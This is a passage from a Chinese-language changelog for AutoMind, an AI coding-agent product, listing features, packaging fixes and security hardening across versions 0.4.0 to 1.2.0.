    失败归因 Top）、200 次运行历史回看、JSON 导出；
  - **企业版**：历史扩至 2000 次，增加按会话（多用户）维度分组统计。
- **事件流增强**（`agent.py`）：`plan_created` 新增 `parent_id` 与
  `root_goal_id`（还原真实计划层级）；`step_action` 新增 `goal_id`
  （工具调用可归属到所属步骤）。均为增量字段，旧消费方不受影响。
- **修复**：Web 端计划步骤进度条从不更新 —— 后端事件用 `goal_id` 标识步骤，
  前端却按 `data.index`（该字段不存在）匹配，导致步骤永远停在「待执行」。
  改为按 `goal_id` 匹配。
- **修复（Linux 打包）**：`.deb` 的 glibc 依赖写死 `>= 2.31`，而产物实测需
  `2.35`（`libcairo.so.2` 等 30 个文件引用 GLIBC_2.34/2.35）——在 Ubuntu 20.04 /
  Debian 11 上会「装得上、一运行就报 GLIBC_2.34 not found」。改为构建时用
  `objdump` 从产物实测取最高版本；`gir1.2-webkit2-*` 由 Recommends 提为
  Depends（PyInstaller 未打包 WebKit2 typelib，缺它只能降级到系统浏览器）。
- **修复（macOS 打包）**：ad-hoc 签名失败不再被 `|| true` 吞掉 —— Apple Silicon
  要求 arm64 二进制必须带有效签名，未签名会被内核 SIGKILL，放行等于发布一个
  在 M 系列机器上根本起不来的包。改为签名后强制 `codesign --verify`，失败即
  中断构建。放行指引补充 macOS 15 (Sequoia) 起右键「打开」旁路已被移除。
- 新增观测中心测试：社区核心 18 项 + 专业版 6 项。

## [1.2.0] - 2026-07-22

**桌面版落地：Windows 安装包 · 自动更新 · 代码签名（Certum 全签名）**

- **🖥 Windows 桌面版**（`desktop/`）：pywebview（WebView2）窗口壳 + 系统托盘 +
  内嵌 uvicorn（仅 127.0.0.1 监听）；启动画面即时反馈、单实例互斥（重复双击
  自动复用）、90s 冷启动容忍、崩溃捕获（错误弹窗 + desktop-error.log）、
  系统代理绕过；关窗最小化到托盘（任务与定时调度继续运行）。降级链完备：
  无 WebView2 → 系统浏览器；无托盘依赖 → 纯窗口。数据目录统一解析
  （`core/paths.py`：`AUTOMIND_DATA_DIR` > 冻结环境 `%APPDATA%\AutoMind` >
  开发/pip 默认 cwd `.automind`，行为不变），`/api/health` 增 `paths` 诊断字段。
- **📦 正式安装包**：Inno Setup 中文向导（`AutoMind-Setup-<ver>.exe`，约 31MB）；
  免管理员按用户安装、WebView2 运行时自动补装（内嵌微软官方引导器）、
  卸载可选保留用户数据。已通过 静默安装→启动→静默卸载 完整 QA。
- **🔄 自动更新**（`core/updater.py`）：GitHub Releases 版本检查（6h 缓存、
  代理→直连双通道）；桌面版一键升级 —— 下载安装包 → **Authenticode 签名校验**
  （已签名程序强制要求新包同发布者，防投毒/降级）→ 静默安装自动重启；
  pip 模式给出升级命令。界面入口：设置菜单「🔄 检查更新」+ 启动静默检查通知
  （`/api/update/check|apply|state`）。
- **🔏 代码签名管线**：`desktop/sign.ps1`（signtool 定位 + SHA256 + RFC3161
  时间戳三服务器回退 + 验签）、`build_release.ps1` 一键流水线（前端→冻结→
  签名→安装器→签名→校验；未配置证书自动降级未签名构建）、installer.iss
  `/DSIGN` 集成（Setup 与卸载器同签）。证书到手设 `AUTOMIND_CERT_THUMBPRINT`
  即全签名产出。
- 新增 updater 测试 10 项，全量 344 项通过。

## [1.1.0] - 2026-07-15

**SQLite 存储引擎 · 界面视觉精修 · 测试与文档增强**

- **🗄 JSON → SQLite 迁移**：新增统一持久化层 `automind/core/db.py`
  （WAL 模式、进程内线程安全、增量写入）。任务历史 / 团队任务 / 每日限额
  → `.automind/automind.db`；对话会话（多用户隔离）→ `.automind/sessions.db`；
  知识库（文档/片段/向量/检索审计日志）→ `.automind/kb/kb.db`。
  首次启动自动从旧 JSON 一次性导入（旧文件保留作备份，升级零感知）；
  配置与 API Key 保持 `.automind_config.json` 纯文本（可手工编辑）。
- **🎨 界面视觉精修**：玻璃拟态侧边栏与顶栏（毛玻璃 + 半透明）、宽屏居中
  阅读列（980px）、导航渐变高亮 + 左侧指示条、用户消息右对齐渐变气泡、
  气泡阴影与悬浮反馈、发光发送按钮、代码块精修（彩点头部 + 阴影）、
  全局按钮过渡动效、环境光背景增强。
- **📖 在线文档优化**：内置使用手册（/manual）新增**目录搜索**与**滚动
  章节高亮**；新增「🗄 数据与存储」章节（存储位置 / 备份迁移指引）；
  使用手册.md 同步新增 10.5 节。
- **🧪 测试覆盖提升**：新增 `tests/test_sqlite_store.py`（14 项：kv/历史
  滚动上限/会话/团队任务/重开持久性/JSON 迁移与损坏兜底/Store 会话
  SQLite 落库与惰性迁移/知识库 SQLite 重载与旧 JSON 迁移/检索日志/限额
  kv 持久化），全量 322 项通过。

## [1.0.0] - 2026-07-14

**正式版：前端全面重构（React 18）· RAG 知识库 · 语义缓存与模型智能路由 · 版本限额**

- **🖥 前端工程化重构（功能不变，体验升级）**：原生 JS × 12 文件整体迁移为
  **React 18 + TypeScript + Vite + pnpm + Ant Design 5 + Zustand** 工程
  （`web/` 目录）。全部既有能力等价保留 —— 五模式对话（WS 流式/中断/审批弹窗/
  执行过程实时面板）、右栏观测面板与 Web IDE（Monaco 按需加载 + Diff）、
  工具/技能/MCP/插件、专家市场、团队看板、统计、定时任务、历史、审计、
  模板库、新手引导、工作区、深浅主题、多模态与语音输入。构建产物输出
  `automind/static/dist`，服务端优先伺服；未构建时自动回退经典界面，零破坏。
- **📚 RAG 知识库（社区版免费）**：上传 PDF / Word(.docx) / Markdown / TXT →
  自动分段 + 特征哈希 embedding（离线可用，装 chromadb 可选加速）→ 对话中
  **自动检索注入上下文**；侧边栏新增「📚 知识库」视图（上传/检索测试/自动
  检索开关）。社区版限 5 文档 / 10MB / 单库（`automind/rag/`，
  `/api/kb` 系列端点）。
- **📚 知识库进阶（专业版 rag_pro）**：无限文档 / 200MB、多知识库管理、
  Reranker 二阶段重排（精度提升）、引用溯源（回答标注 [编号] 与来源文档/
  段落）、定时自动重新 embedding、可选 Milvus / Pinecone / Qdrant 向量后端。
- **📚 知识库企业版（kb_enterprise）**：总量不限、**混合检索**（向量语义 +
  词法 BM25-lite 双通道融合，专名/型号精确命中）、文档热度统计
  （`/api/kb/stats`）、检索审计日志（`/api/kb/search-log`）、
  服务器目录批量导入（`/api/kb/import-dir`）。
- **⚡ 语义缓存（专业版 semantic_cache）**：对话模式相似问题秒回历史答案
  （0 Token）。专业版基础缓存（300 条 / TTL 24h），企业版高级缓存
  （2000 条 / TTL 7 天 / 命中与节省统计）（`/api/cache`）。
- **🧭 模型智能路由（专业版 model_router）**：按任务复杂度（长度/代码特征/
  多步骤标志，0~100 启发式打分）自动选择模型档位 —— 专业版 2 级路由，
  企业版 N 级路由；支持路由预演（`/api/router`、`/api/router/preview`）。
- **💰 成本仪表盘（企业版 cost_dashboard）**：按模型/日聚合 Token 用量与
  估算成本，叠加语义缓存节省额度（`/api/costs`）。
- **📏 版本限额**：社区版每日任务 100 次、工作区 3 个；专业版任务不限、
  工作区 30 个；企业版全部不限（`automind/core/quota.py`，`/api/quota`；
  超限返回友好升级提示，跨天自动滚动，重启不清零）。
- 侧边栏新增「🧭 路由与成本」视图（缓存开关/命中率、路由档位配置与预演、
  成本仪表盘）；工作区弹窗与顶栏徽标展示限额用量（如 `0/100`）。

## [0.9.0] - 2026-07-12

**Web IDE · 团队协作 · 专家系统三大能力落地**

- **📄 代码编辑器（Web IDE，社区版）**：右栏新增「📄 代码」标签 —— 项目文件树
  （排除依赖/缓存目录）+ **Monaco 编辑器**（jsDelivr 按需加载，CSP 定向放行，
  离线自动回退基础编辑器）+ **改动 Diff 预览**（前像 vs 当前，Monaco DiffEditor）；
  `Ctrl+S` 保存，前像记入改动日志可撤销；读写严格限定项目根（防穿越）；
  代码标签激活时右栏自动加宽，不影响聊天区（`/api/files/tree|read|write`、
  `/api/changes/diff`）。
- **🎓 专家系统与专家市场**：专家 = 可复用角色设定，激活后所有任务注入执行
  （`automind/core/experts.py`）。社区版：官方精选 10 个专家一键安装 +
  自建最多 3 个；专业版（experts_pro）：无限创建、团队分享、JSON 导入/导出、
  使用统计；企业版（expert_approval）：分享需管理员审批后全员可见
  （`/api/experts` 系列 + `/api/experts/pending|approve`）。
- **👥 团队协作（社区版）**：任务分配看板（待办/进行中/已完成，
  `/api/team/tasks`）；任务完成实时广播 `team_activity` —— 同事的 Agent
  改了文件会收到弹窗提醒与活动流记录；工作区/自定义模板/专家均为服务器级
  存储，同一部署天然团队共享。
- 前端新增 editor.js / experts.js / team.js 三个模块；侧边栏新增
  🎓 专家市场 与 👥 团队 视图；模式提示条显示激活专家徽标。

## [0.8.0] - 2026-07-09

**商业功能扩容（社区核心仅新增特性注册表与两个稳定契约键，功能不减）**

- 专业版 ⭐ **自定义模板**：把常用任务保存为模板（名称/图标/模式/提示词，
  上限 100 个），模板库弹窗管理并一键填入；持久化于
  `.automind/custom_templates.json`（`/api/templates/custom`）。
- 专业版 📄 **审计报告导出（PDF）**：安全审计日志一键导出正式报告——装有
  reportlab 时输出真 PDF（内置中文 CID 字体），否则输出可打印保存为 PDF 的
  自包含 HTML（`/api/audit/export`）。
- 企业版 🔐 **SSO / LDAP 单点登录**：LDAP bind（ldap3）或内置用户目录校验，
  签发短期会话令牌并经新扩展点 `register_token_validator` 接入既有鉴权中间件，
  HTTP 与 WebSocket 通用（`/api/auth/login|session|logout`）。
- 企业版 🧩 **细粒度权限（RBAC）**：角色 × 动作矩阵（`tool:*`/`api:*` 通配），
  内置 admin/developer/viewer 三角色，可自定义角色（`/api/rbac`）。
- 企业版 🚪 **私有模型网关**：全部提供商 api_base 一键收敛到企业网关
  （原地址自动备份、停用即恢复），模型白名单校验（`/api/gateway`）。
- 社区核心：`edition.py` 特性注册表 +5；server_ctx 追加 `register_token_validator`
  与 `rebuild_agent` 两个契约键（向后兼容）；社区版访问新端点返回 403 升级提示。
- **🔌 Agent 集成（社区版）**：OpenAI 兼容 API —— `POST /v1/chat/completions`
  （SSE 流式 + 多模态文本分片拍平 + 用量统计）与 `GET /v1/models`；
  「⚙ 设置 → 🔌 集成」标签页一键生成 **Continue.dev**（VS Code/JetBrains
  侧边面板）即贴即用配置，任何 OpenAI 客户端（Cline/Zed/脚本）均可接入；
  `/v1/*` 与 `/api/*` 同等鉴权（静态令牌 / SSO 会话令牌）并纳入限流。

## [0.7.1] - 2026-07-09

- **文档**：使用手册（md + 内置 HTML 手册）新增三种安装方式说明 —— PyPI
  （`pip install "automind-agent[web]"`）、GitHub 源码克隆、本地源码目录，
  含升级命令与国内镜像提速提示。
- **编程准确度**：TDD 内环语法自检扩展到 **YAML / TOML**（覆盖 Python/JSON/
  YAML/TOML 四类结构化文件）；`file_read` 支持 **offset/limit 按行分段读取**，
  超大文件自动截断并提示分段读（防止上下文被撑爆导致后续编辑失准）；
  `file_edit` 拒绝 old_string 与 new_string 相同的无效编辑并给出明确提示。
- **对话展示美化**：气泡内 Markdown 完整渲染 —— 标题（#~####）、有序/无序
  列表、**表格**（圆角边框 + 悬停高亮 + 横向滚动）、引用块（侧边条）、
  分隔线、删除线、斜体；深浅两种主题均适配；XSS 防线不变（内容先转义
  再做结构化包装，已验证 `<script>` 注入仅按纯文本显示）。

## [0.7.0] - 2026-07-07

**体验与安全感升级（后端功能不变，前端架构模块化增强）**

- 🌓 **浅色模式**：右上角一键切换深/浅主题，随系统偏好自动初始化，持久化记忆。
- 💰 **实时 Token 成本显示**：Token 面板与每条结果显示预估花费（内置主流模型
  单价表，点击成本数字可自定义单价）。
- 🗂 **工作区管理**：每个工作区 = 独立目录 + 独立上下文；切换后 Agent 在新目录
  下重建（记忆/索引/权限根随之切换），各工作区会话互不可见、任务互不污染
  （新增 `/api/workspaces` 系列端点）。
- 📜 **任务历史可回溯**：历史持久化到 `.automind/task_history.json`（关浏览器/
  重启服务不丢）；支持查看完整产出、一键复制、一键重跑。
- ▶ **任务中断继续**：任务中断/出错后提供「继续此任务」按钮，带着"不重做已完成
  部分"的指令续跑，避免 Token 浪费在重做上。
- ↩️ **撤销/回滚**：全局文件改动日志记录 Agent 每次写入/编辑的前像，右栏
  「文件改动」面板可单文件撤销或全部回滚（新建文件删除、修改文件恢复原内容，
  新增 `/api/changes` 端点）。
- 🧭 **新手引导**：首次打开自动弹出 4 步引导（配 Key → 选模式 → 用模板 → 安全
  机制），❓ 按钮可随时重看。
- 📚 **模板库**：社区版内置 10 个基础模板（个人主页/项目脚手架/修 Bug/补测试/
  数据分析/爬虫/周报/翻译…），欢迎页快速开始 + 📚 弹窗一键填入。
- 前端架构：新增 theme.js / workspace.js / templates.js 三个特性模块，
  静态资源测试同步更新。
- **打包修复**：wheel 此前完全不含 Web 界面静态资源（0.4.0 起即存在，
  pip 安装后界面退化为兜底页）——补充 `[tool.setuptools.package-data]`，
  现随包分发全部 16 个静态文件。

## [0.6.0] - 2026-07-06

**版本体系（开源核心模式）— 社区版 / 商业版分离**

- 新增 `automind/core/edition.py`：社区/专业/企业三版本特性门控与**稳定扩展协议 v1**；
  社区核心零商业代码，商业能力由独立分发的 `automind-pro` 包运行时注入。
- 迁入商业包：🤝 协同模式（多智能体）、🔁 循环模式（Loop Engineering）、
  ⏰ 定时任务、📊 高级统计仪表盘（专业版）；👥 会话级 Agent 池（企业版）。
- 社区版访问商业端点返回 `403 + 升级提示`；界面显示版本徽标、商业入口显示 🔒；
  `/api/health`、`/api/status` 返回 `edition` 与 `features`。
- 离线许可证（`AUTOMIND_LICENSE` / `.automind_license`，HMAC 签名），
  无效或过期自动降级社区版，服务照常启动。
- 安全能力（鉴权/限流/密钥脱敏/审计）**保留在社区版**。
- 共享角色提示词迁至 `automind/core/prompts.py`。
- 打包：社区包显式 `include = ["automind", "automind.*"]`，构建脚本
  `scripts/build_community.py` 自动审计产物中不含商业代码。
- 修复：子进程输出显式 UTF-8 解码（中文 Windows 默认 GBK 导致环境探测/
  测试技能崩溃）；新增 `/manual` 内置手册路由与界面 📖 入口。
- **编程准确度增强**：`file_edit` 精确匹配失败时回显文件中最接近的片段
  （带行号），模型可按原文立即纠正缩进/空白差异；ReAct TDD 内环语法自检
  升级——使用工具解析后的绝对路径、覆盖 `file_multi_edit` 的每个文件、
  新增 JSON 校验。
- 代码质量基线：`ruff check .` 全仓通过（修复 80+ 项，存量风格豁免见
  `pyproject.toml [tool.ruff.lint]`），CI 强制 lint + 双 Python 版本测试。

## [0.5.0]

- **执行态多用户隔离（Session-Agent-Pool）**：多会话并发执行互不干扰
  （0.6.0 起归入企业版）。
- **长对话性能**：消息列表虚拟滚动（`content-visibility`）、流式输出节流增量渲染。
- **可观测性**：向量库异常转为结构化日志，不再静默吞没。

## [0.4.0]

- 修复多处前端 XSS、WebSocket 断线指数退避重连、消息渲染内存泄漏、
  任务出错/取消时流式气泡清理、localStorage 容量上限。
- 后端安全响应头（CSP 等）、真实语义嵌入、CLI `--restore` 检查点恢复、
  生命周期迁移到 FastAPI lifespan。
